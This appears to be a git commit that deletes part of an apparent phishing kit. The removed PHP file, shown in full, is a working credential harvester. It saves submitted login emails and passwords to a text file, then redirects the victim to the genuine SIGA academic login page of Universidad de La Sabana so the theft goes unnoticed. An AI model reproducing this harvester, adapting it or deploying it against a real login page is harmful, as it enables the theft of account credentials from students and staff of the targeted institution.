34c54021b06e42a193e138bd6dfa5661f80eff71
Stanace33 <147786899+Stanace33@users.noreply.github.com>
2024-05-06 11:53:35 -0500

    Delete .sites/siga directory

--- .sites/siga/post.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", " Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
-header('Location: https://sigaacademico.unisabana.edu.co/psp/CS90PRO/?&cmd=login&languageCd=ESP/');
-exit();
-?>
